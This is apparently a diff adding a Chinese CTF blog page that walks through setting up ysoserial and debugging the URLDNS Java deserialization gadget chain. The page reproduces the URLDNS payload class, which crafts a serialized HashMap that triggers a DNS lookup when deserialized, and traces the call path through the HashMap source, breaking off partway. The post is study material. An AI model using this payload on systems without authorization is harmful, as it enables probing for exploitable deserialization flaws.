@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前面巴拉巴拉一堆理论，现在来看看操作，还是要调试啊  我勒个前导配置工作啊总结一下flow 环境配置jdk1.7u21或者1.8都可以   git clone ysoserial源码 library导入jar包(不使用maven解决) maven文件找到mainClass，进入 成功运行，配置默认debug参数 可以带参数进行运行了 references p牛知识星球    也算学到了经验 记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全5(2)_URLDNS链入门">
+<meta property="og:url" content="https://kc1zs4.github.io/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/index.html">
+<meta property="og:site_name" content="KC1zs4&#39;s Blog">
+<meta property="og:description" content="前面巴拉巴拉一堆理论，现在来看看操作，还是要调试啊  我勒个前导配置工作啊总结一下flow 环境配置jdk1.7u21或者1.8都可以   git clone ysoserial源码 library导入jar包(不使用maven解决) maven文件找到mainClass，进入 成功运行，配置默认debug参数 可以带参数进行运行了 references p牛知识星球    也算学到了经验 记录">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://kc1zs4.github.io/pic/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/%E4%BE%9D%E8%B5%96%E6%8A%A5%E9%94%99.png">
+<meta property="article:published_time" content="2024-11-15T06:25:01.892Z">
+<meta property="article:modified_time" content="2024-11-16T06:45:25.778Z">
+<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="java反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kc1zs4.github.io/pic/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/%E4%BE%9D%E8%B5%96%E6%8A%A5%E9%94%99.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Java安全5(2)_URLDNS链入门</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/11/16/Java%E5%AE%89%E5%85%A85(3)_CC1_TransformedMap/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/14/ciscn23%E5%88%9D%E8%B5%9B/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/&text=Java安全5(2)_URLDNS链入门"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/&title=Java安全5(2)_URLDNS链入门"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/&is_video=false&description=Java安全5(2)_URLDNS链入门"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java安全5(2)_URLDNS链入门&body=Check out this article: https://kc1zs4.github.io/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/&title=Java安全5(2)_URLDNS链入门"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/&title=Java安全5(2)_URLDNS链入门"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/&title=Java安全5(2)_URLDNS链入门"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/&title=Java安全5(2)_URLDNS链入门"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/&name=Java安全5(2)_URLDNS链入门&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/&t=Java安全5(2)_URLDNS链入门"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%91%E5%8B%92%E4%B8%AA%E5%89%8D%E5%AF%BC%E9%85%8D%E7%BD%AE%E5%B7%A5%E4%BD%9C%E5%95%8A"><span class="toc-number">1.</span> <span class="toc-text">我勒个前导配置工作啊</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8Bflow"><span class="toc-number">1.1.</span> <span class="toc-text">总结一下flow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B9%9F%E7%AE%97%E5%AD%A6%E5%88%B0%E4%BA%86%E7%BB%8F%E9%AA%8C"><span class="toc-number">1.2.</span> <span class="toc-text">也算学到了经验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%84%9F%E8%B0%A2jar%E5%8C%85%E6%95%91%E6%88%91"><span class="toc-number">1.3.</span> <span class="toc-text">*感谢jar包救我</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URLDNS%E5%8A%A8%E6%89%8B%E8%B0%83%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text">URLDNS动手调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget-Chains"><span class="toc-number">2.1.</span> <span class="toc-text">Gadget Chains</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URLDNS-java"><span class="toc-number">2.2.</span> <span class="toc-text">URLDNS.java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HashMap-readObject"><span class="toc-number">2.3.</span> <span class="toc-text">HashMap.readObject()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HashMap-hash"><span class="toc-number">2.4.</span> <span class="toc-text">HashMap.hash()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URL-hashCode"><span class="toc-number">2.5.</span> <span class="toc-text">URL.hashCode()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URLStreamHandler-hashCode"><span class="toc-number">2.6.</span> <span class="toc-text">URLStreamHandler.hashCode()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URLStreamHandler-getHostAddress"><span class="toc-number">2.7.</span> <span class="toc-text">URLStreamHandler.getHostAddress()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dst-InetAddress-getByName-host"><span class="toc-number">2.8.</span> <span class="toc-text">Dst: InetAddress.getByName(host)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URLDNS%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3"><span class="toc-number">3.</span> <span class="toc-text">URLDNS深入理解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Q-%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81SilentURLStreamHandler%E7%B1%BB"><span class="toc-number">3.1.</span> <span class="toc-text">Q: 为什么需要SilentURLStreamHandler类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Q-%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E5%8F%8D%E5%B0%84%E8%AE%BE%E7%BD%AEhashCode-1"><span class="toc-number">3.2.</span> <span class="toc-text">Q: 为什么需要反射设置hashCode&#x3D;-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URLDNS-poc"><span class="toc-number">3.3.</span> <span class="toc-text">URLDNS poc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ref"><span class="toc-number">4.</span> <span class="toc-text">Ref</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Java安全5(2)_URLDNS链入门
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name"></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-15T06:25:01.892Z" class="dt-published" itemprop="datePublished">2024-11-15</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a>, <a class="p-category" href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">java反序列化</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <blockquote>
+<p>前面巴拉巴拉一堆理论，现在来看看操作，还是要调试啊</p>
+</blockquote>
+<h2 id="我勒个前导配置工作啊"><a href="#我勒个前导配置工作啊" class="headerlink" title="我勒个前导配置工作啊"></a>我勒个前导配置工作啊</h2><h3 id="总结一下flow"><a href="#总结一下flow" class="headerlink" title="总结一下flow"></a>总结一下flow</h3><blockquote>
+<p>环境配置<br>jdk1.7u21或者1.8都可以</p>
+</blockquote>
+<ol>
+<li>git clone ysoserial源码</li>
+<li>library导入jar包(不使用maven解决)</li>
+<li>maven文件找到mainClass，进入</li>
+<li>成功运行，配置默认debug参数</li>
+<li>可以带参数进行运行了</li>
+<li>references<ol>
+<li><a target="_blank" rel="noopener" href="https://wx.zsxq.com/group/2212251881/topic/244415545824541">p牛知识星球</a></li>
+</ol>
+</li>
+</ol>
+<h3 id="也算学到了经验"><a href="#也算学到了经验" class="headerlink" title="也算学到了经验"></a>也算学到了经验</h3><ol>
+<li>记录一下过程中遇到的东西</li>
+<li>P1: 首先是报错java版本6问题，是因为版本设置不当，在project structure中修改一下就好了</li>
+<li>P2: 下载依赖时报错<img src="/pic/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/%E4%BE%9D%E8%B5%96%E6%8A%A5%E9%94%99.png" alt="error"><ol>
+<li><strong>S1: 尝试配置library</strong>: 手动导入library下载intercepter3.1，发现自带的搜索中没有这个</li>
+<li><strong>S2: 尝试配置仓库</strong>: 访问报错中的网址发现居然是400，即使是换了有intercepter3.1的仓库依然无法下载，但是这是个好思路</li>
+</ol>
+</li>
+</ol>
+<h3 id="感谢jar包救我"><a href="#感谢jar包救我" class="headerlink" title="*感谢jar包救我"></a>*感谢jar包救我</h3><blockquote>
+<p>出师未捷身先死，常使英雄泪满襟。依赖一直有问题，最后搞清楚是库问题后也卡死了，还好有b1nb1n大哥<br>特此感谢耐心教导的b1nb1n大哥</p>
+</blockquote>
+<hr>
+<blockquote>
+<p>总结一下<br>1.其实配置环境时遇到了问题就像是做web题，都要找到方向来解决，还是要好好看报错信息再理解一下<br>2.这里其实还是工具不熟悉导致的，工欲善其事必先利其器啊，不过有提示说在library应该有敏感度了解一下java的，也是有搜“idea libraries配置”过，不过还是急了<br>3.可以横向衍生一下，搜一下”idea调试项目”类似的</p>
+</blockquote>
+<ol>
+<li>b1nb1n哥一操作就好了，tql</li>
+<li>在有源码的情况下，可以直接在library配置出+java这里导入可以运行的jar文件，然后就直接可以运行了 –&gt; 如果没有源码需要<strong>反编译一下</strong>jadx，有需要再来</li>
+</ol>
+<h2 id="URLDNS动手调试"><a href="#URLDNS动手调试" class="headerlink" title="URLDNS动手调试"></a>URLDNS动手调试</h2><h3 id="Gadget-Chains"><a href="#Gadget-Chains" class="headerlink" title="Gadget Chains"></a>Gadget Chains</h3><blockquote>
+<p>参考一下p牛的安全漫谈，p牛这个思路和他说的先看源码调节这点很契合<br>原理参考一下ref</p>
+</blockquote>
+<ol>
+<li><em><strong>目标导向式的调试就ok了这里</strong></em>: 一步一步深入</li>
+<li>第一次调试成功了！！！</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ysoserial URLDNS.java</span></span><br><span class="line">Gadget Chain:</span><br><span class="line">  HashMap.readObject()</span><br><span class="line">    HashMap.putVal()</span><br><span class="line">      HashMap.hash()</span><br><span class="line">        URL.hashCode()</span><br><span class="line">As part of deserialization, HashMap calls hashCode on each key that it</span><br><span class="line">deserializes, so using a Java URL object as a serialized key allows</span><br><span class="line">it to trigger a DNS lookup.</span><br><span class="line"></span><br><span class="line"><span class="comment">// mime</span></span><br><span class="line">Gadget Chain:</span><br><span class="line"> HashMap</span><br><span class="line">  HashMap.readObejct()</span><br><span class="line">   HashMpa.hash()</span><br><span class="line">    URL.hashCode()</span><br><span class="line">     URLStreamHandler.hashCode()</span><br><span class="line">      URLStreamHandler.getHostAddress()</span><br><span class="line">       IntAddress.getByName()   <span class="comment">// trigger the dns query</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="URLDNS-java"><a href="#URLDNS-java" class="headerlink" title="URLDNS.java"></a>URLDNS.java</h3><ol>
+<li>从ysosrial的URLDNS.java阅读代码和<strong>注释</strong>，可以知道这条链的利用点在于getObject返回的序列化对象(就是payload)，这个类很短，不难读懂<ol>
+<li><strong>Slient..Class详见下面的Q</strong></li>
+</ol>
+</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies()</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        </span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="HashMap-readObject"><a href="#HashMap-readObject" class="headerlink" title="HashMap.readObject()"></a>HashMap.readObject()</h3><ol>
+<li>触发序列化漏洞是readObject方法，那就来看看返回的HashMap对象的readObject方法<ol>
+<li>根据上述payload中的u对象，跳转到<code>Key.readObject()</code></li>
+<li>注意到是<code>URLStreamHandler</code>的子类，此处需要进入到</li>
+<li>我使用的是java1.7u21版本，这里和网上很多文章不一样，最后是<code>putForCreate()</code>，但是进入后也有<code>hash(key)</code></li>
+</ol>
+</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line"> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                           loadFactor);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set hashSeed (can only happen after VM boot)</span></span><br><span class="line">    Holder.UNSAFE.putIntVolatile(<span class="built_in">this</span>, Holder.HASHSEED_OFFSET,</span><br><span class="line">            sun.misc.Hashing.randomHashSeed(<span class="built_in">this</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in number of buckets and allocate the bucket array;</span></span><br><span class="line">    s.readInt(); <span class="comment">// ignored</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read number of mappings</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                           mappings);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">initialCapacity</span> <span class="operator">=</span> (<span class="type">int</span>) Math.min(</span><br><span class="line">            <span class="comment">// capacity chosen by number of mappings</span></span><br><span class="line">            <span class="comment">// and desired load (if &gt;= 0.25)</span></span><br><span class="line">            mappings * Math.min(<span class="number">1</span> / loadFactor, <span class="number">4.0f</span>),</span><br><span class="line">            <span class="comment">// we have limits...</span></span><br><span class="line">            HashMap.MAXIMUM_CAPACITY);</span><br><span class="line">    <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// find smallest power of two which holds all mappings</span></span><br><span class="line">    <span class="keyword">while</span> (capacity &lt; initialCapacity) &#123;</span><br><span class="line">        capacity &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    table = <span class="keyword">new</span> <span class="title class_">Entry</span>[capacity];</span><br><span class="line">    threshold = (<span class="type">int</span>) Math.min(capacity * loadFactor, MAXIMUM_CAPACITY + <span class="number">1</span>);</span><br><span class="line">    useAltHashing = sun.misc.VM.isBooted() &amp;&amp;</span><br><span class="line">            (capacity &gt;= Holder.ALTERNATIVE_HASHING_THRESHOLD);</span><br><span class="line"></span><br><span class="line">    init();  <span class="comment">// Give subclass a chance to do its thing.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;mappings; i++) &#123;</span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">        putForCreate(key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="HashMap-hash"><a href="#HashMap-hash" class="headerlink" title="HashMap.hash()"></a>HashMap.hash()</h3><ol>
+<li>根据ysoserial的注释，可以知道这条链的关键在于hashCode被计算(hash()会调用)，所以在<code>hash(key)</code>处进入&#x2F;断点，进入到HashMap.hash()<ol>
+<li>可以内部逻辑不重要，重要的是跳转到了k.hashCode()，由于继承了URLStreamHandler，进入该类的hashCode一看</li>
+</ol>
+</li>
+</ol>
